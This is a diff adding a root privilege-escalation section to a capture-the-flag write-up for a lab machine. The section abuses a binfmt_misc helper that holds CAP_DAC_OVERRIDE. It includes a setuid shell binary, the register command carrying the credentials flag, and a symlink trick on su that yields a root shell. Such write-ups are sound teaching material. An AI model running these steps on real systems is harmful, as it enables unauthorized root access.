@@ -417,7 +417,7 @@ $ ropper -f libc-2.31.so --search "mov [rdi], rdx; ret"
 
 Now that we have everything we need we are going to generate the final exploit with all of the above.
 
-```bash
+```python
 from pwn import *
 
 offset = 520
@@ -582,3 +582,132 @@ inflating: var/www/html/home/activate_license/activate_license
 The backup has been created correctly, and when extracting it we can see the home directory of the user, now we already have the ssh key, so we download it and login into the machine as the user `dev`.
 
 ## Getting root shell
+
+Once we login with `ssh`, we see in the user's home a folder called `emuemu`, in the `README.md` there is a description of what it is.
+
+> EMUEMU is the official software emulator for the handheld console OSTRICH. After installation with `make install`, OSTRICH ROMs can be simply executed from the terminal. For example the ROM named `rom` can be run with `./rom`.
+{: .prompt-info }
+
+We see that it uses make, so let's take a look at the `Makefile` to see what it contains.
+
+```bash
+CC := gcc
+CFLAGS := -std=c99 -Wall -Werror -Wextra -Wpedantic -Wconversion -Wsign-conversion
+
+SOURCES := $(wildcard *.c)
+TARGETS := $(SOURCES:.c=)
+
+.PHONY: install clean
+
+install: $(TARGETS)
+        @echo "[+] Installing program files"
+        install --mode 0755 emuemu /usr/bin/
+        mkdir --parent --mode 0755 /usr/lib/emuemu /usr/lib/binfmt.d
+        install --mode 0750 --group dev reg_helper /usr/lib/emuemu/
+        setcap cap_dac_override=ep /usr/lib/emuemu/reg_helper
+
+        @echo "[+] Register OSTRICH ROMs for execution with EMUEMU"
+        echo ':EMUEMU:M::\x13\x37OSTRICH\x00ROM\x00::/usr/bin/emuemu:' \
+                | tee /usr/lib/binfmt.d/emuemu.conf \
+                | /usr/lib/emuemu/reg_helper
+
+clean:
+        rm -f -- $(TARGETS)
+```
+
+My attention is drawn to line 14 as it is providing the [CAP_DAC_OVERRIDE](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_dac_override) capability to the `reg_helper` file, this means that `reg_helper` can write to any file on the system.
+
+```bash
+dev@retired:~/emuemu$ ls -la /usr/lib/emuemu/reg_helper
+-rwxr-x--- 1 root dev 16864 Oct 13  2021 /usr/lib/emuemu/reg_helper
+```
+{: .nolineno }
+
+We can run `reg_helper`, so let's first see what it is doing.
+
+```c
+#define _GNU_SOURCE
+
+#include <fcntl.h>
+#include <stdio.h>
+#include <string.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+int main(void) {
+    char cmd[512] = { 0 };
+
+    read(STDIN_FILENO, cmd, sizeof(cmd)); cmd[-1] = 0;
+
+    int fd = open("/proc/sys/fs/binfmt_misc/register", O_WRONLY);
+    if (-1 == fd)
+        perror("open");
+    if (write(fd, cmd, strnlen(cmd,sizeof(cmd))) == -1)
+        perror("write");
+    if (close(fd) == -1)
+        perror("close");
+
+    return 0;
+}
+```
+
+`reg_helper` is opening `/proc/sys/fs/binfmt_misc/register`, let's see what exactly is [binfmt_misc](https://docs.kernel.org/admin-guide/binfmt-misc.html).
+
+> binfmt-misc allows you to invoke almost (for restrictions see below) every program by simply typing its name in the shell. To actually register a new binary type, you have to set up a string looking like `:name:type:offset:magic:mask:interpreter:flags` (where you can choose the : upon your needs) and echo it to `/proc/sys/fs/binfmt_misc/register`.
+{: .prompt-info }
+
+With this in mind, if we look again at the Makefile on `line 17`, what it is doing is registering a new binary type, because the input received by `reg_helper` is being passed as input to `binfmt_misc/register`. As we have execution permissions on `reg_helper`, then we can register our own binary type. 
+
+There is a very important section stated in the `binfmt_misc` documentation, which reads as follows:
+
+```
+flags
+
+  C - credentials
+    Currently, the behavior of binfmt_misc is to calculate the credentials and security token of the new process according to the interpreter. When this flag is included, these attributes are calculated according to the binary. It also implies the O flag. This feature should be used with care as the interpreter will run with root permissions when a setuid binary owned by root is run with binfmt_misc.
+```
+{: .nolineno }
+
+Therefore, the plan of attack would be as follows:
+- create a binary that when executed returns a shell
+- register a new binary type with a custom extension, so that when a file with that extension is executed, first launch our binary with the shell
+- execute a setuid binary owned by root with the custom extension, so that it uses the same permissions and executes our shell as root.
+
+We are going to create the binary so that it returns a shell when executed in the tmp folder.
+
+```c
+int main (void) {
+  setuid(0);
+  setgid(0);
+  system("/bin/bash");
+}
+```
+{: .nolineno }
+
+```bash
+dev@retired:/tmp$ gcc supershell.c -o supershell
+```
+{: .nolineno }
+
+Lets register a new binary type with a custom extension `V3`
+
+```bash
+dev@retired:/tmp$ echo ":v3he:E::V3::/tmp/supershell:C" | /usr/lib/emuemu/reg_helper
+```
+{: .nolineno }
+
+Let's find a binary with setuid and create a symbolic link by changing the extension to the custom we registered before.
+
+```bash
+dev@retired:/tmp$ find / -perm -4000 2>/dev/null
+[...]
+/usr/bin/su
+[...]
+
+dev@retired:/tmp$ ln -s /usr/bin/su su.V3
+dev@retired:/tmp$ ./su.V3
+root@retired:/tmp# whoami
+root
+```
+{: .nolineno }
